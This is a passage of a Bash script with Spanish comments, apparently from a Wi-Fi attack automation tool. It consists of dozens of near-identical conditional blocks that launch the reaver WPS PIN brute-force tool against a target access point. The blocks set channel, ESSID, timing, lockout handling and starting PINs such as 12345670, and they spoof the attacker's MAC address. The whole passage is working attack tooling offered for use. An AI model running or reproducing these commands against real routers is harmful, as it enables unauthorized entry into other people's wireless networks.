########PIN añade

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver5e-dh" -e sh -c "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -L -vvv -x 60  --pin=$WPS_PIN1 --session=/etc/reaver/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver6e-dh" -e sh -c "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -L -vvv -x 60 -r $RX1:$RY1 --pin=$WPS_PIN1 --session=/etc/reaver/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver7e-dh" -e sh -c "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$WPS_PIN1 --session=/etc/reaver/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver8e-dh" -e sh -c "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -r $RX1:$RY1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$WPS_PIN1 --session=/etc/reaver/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

#######Empezar Reaver opciones de canales de salto

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver1he-dh" -e sh -c "reaver -i $MON -a -b $TARGETAP1 -e "$NMEWARN2" -vvv -x 60 -L -S --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver2he-dh" -e sh -c "reaver -i $MON -a -b $TARGETAP1 -e "$NMEWARN2" -L -S -vvv -x 60 -r $RX1:$RY1 --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver3he-dh" -e sh -c "reaver -i $MON -a -b $TARGETAP1 -e "$NMEWARN2" -L -S -E -vvv -N -T 1 -t 20 -d 0 -x 30 --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver4he-dh" -e sh -c "reaver -i $MON -a -b $TARGETAP1 -e "$NMEWARN2" -r $RX1:$RY1 -L -S -E -vvv -N -T 1 -t 20 -d 0 -x 30 --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver5he-dh" -e sh -c "reaver -i $MON -a -b $TARGETAP1 -e "$NMEWARN2" -L -vvv -x 60  --pin=$WPS_PIN1 --session=/etc/reaver/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver6he-dh" -e sh -c "reaver -i $MON -a -b $TARGETAP1 -e "$NMEWARN2" -L -vvv -x 60 -r $RX1:$RY1 --pin=$WPS_PIN1 --session=/etc/reaver/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver7he-dh" -e sh -c "reaver -i $MON -a -b $TARGETAP1 -e "$NMEWARN2" -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$WPS_PIN1 --session=/etc/reaver/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver8he-dh" -e sh -c "reaver -i $MON -a -b $TARGETAP1 -e "$NMEWARN2" -r $RX1:$RY1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$WPS_PIN1 --session=/etc/reaver/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

###fin todas -dh-small  Reaver Booleanos programa con -e essid Finalizar todo -dh-small###
}

#~~~~~~~~~~~~~fin Reaver Booleanos fin~~~~~~~~~~~~~~~~~#

#~~~~~~~~~~Empezar Reiniciar pin 12345670 prueba de temperatura Empezar~~~~~~~~~~#

STARTPIN_BOOLEANS_fn()

{

MACSTRIP=$(echo $TARGETAP1 | tr -d -c [:xdigit:])
########PIN añade

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver5-no-dh-test12345670" -e sh -c "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -L -vvv -x 60  --pin=$STARTPIN --session=/etc/reaver/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver6-no-dh-test12345670" -e sh -c "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -L -vvv -x 60 -r $RX1:$RY1 --pin=$STARTPIN --session=/etc/reaver/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver7-no-dh-test12345670" -e sh -c "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$STARTPIN --session=/etc/reaver/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver8-no-dh-test12345670" -e sh -c "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -r $RX1:$RY1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$STARTPIN --session=/etc/reaver/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

#######Empezar Reaver opciones de canales de salto

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver5h-no-dh-test12345670" -e sh -c "reaver -i $MON -a -b $TARGETAP1 -L -vvv -x 60  --pin=$STARTPIN --session=/etc/reaver/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver6h-no-dh-test12345670" -e sh -c "reaver -i $MON -a -b $TARGETAP1 -L -vvv -x 60 -r $RX1:$RY1 --pin=$STARTPIN --session=/etc/reaver/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver7h-no-dh-test12345670" -e sh -c "reaver -i $MON -a -b $TARGETAP1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$STARTPIN --session=/etc/reaver/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver8h-no-dh-test12345670" -e sh -c "reaver -i $MON -a -b $TARGETAP1 -r $RX1:$RY1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$STARTPIN --session=/etc/reaver/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

###fin  Reaver Booleanos Programa ninguna -e essid fin###

###Empezar Reaver Booleanos programa EMPEZAR con -e essid###

########PIN añade

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver5e-no-dh-test12345670" -e sh -c "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -L -vvv -x 60  --pin=$STARTPIN --session=/etc/reaver/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver6e-no-dh-test12345670" -e sh -c "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -L -vvv -x 60 -r $RX1:$RY1 --pin=$STARTPIN --session=/etc/reaver/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver7e-no-dh-test12345670" -e sh -c "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$STARTPIN --session=/etc/reaver/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver8e-no-dh-test12345670" -e sh -c "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -r $RX1:$RY1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$STARTPIN --session=/etc/reaver/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver5he-no-dh-test12345670" -e sh -c "reaver -i $MON -a -b $TARGETAP1 -e "$NMEWARN2" -L -vvv -x 60  --pin=$STARTPIN --session=/etc/reaver/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver6he-no-dh-test12345670" -e sh -c "reaver -i $MON -a -b $TARGETAP1 -e "$NMEWARN2" -L -vvv -x 60 -r $RX1:$RY1 --pin=$STARTPIN --session=/etc/reaver/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver7he-no-dh-test12345670" -e sh -c "reaver -i $MON -a -b $TARGETAP1 -e "$NMEWARN2" -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$STARTPIN --session=/etc/reaver/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver8he-no-dh-test12345670" -e sh -c "reaver -i $MON -a -b $TARGETAP1 -e "$NMEWARN2" -r $RX1:$RY1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$STARTPIN --session=/etc/reaver/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

###fin Todo sin --dh-small -S fin#####

########PIN añade

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver5-no-dh-test12345670" -e sh -c "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -L -vvv -x 60  --pin=$STARTPIN --session=/etc/reaver/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver6-no-dh-test12345670" -e sh -c "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -L -vvv -x 60 -r $RX1:$RY1 --pin=$STARTPIN --session=/etc/reaver/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver7-no-dh-test12345670" -e sh -c "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$STARTPIN --session=/etc/reaver/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver8-no-dh-test12345670" -e sh -c "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -r $RX1:$RY1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$STARTPIN --session=/etc/reaver/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver5h-no-dh-test12345670" -e sh -c "reaver -i $MON -a -b $TARGETAP1 -L -vvv -x 60  --pin=$STARTPIN --session=/etc/reaver/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver6h-no-dh-test12345670" -e sh -c "reaver -i $MON -a -b $TARGETAP1 -L -vvv -x 60 -r $RX1:$RY1 --pin=$STARTPIN --session=/etc/reaver/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

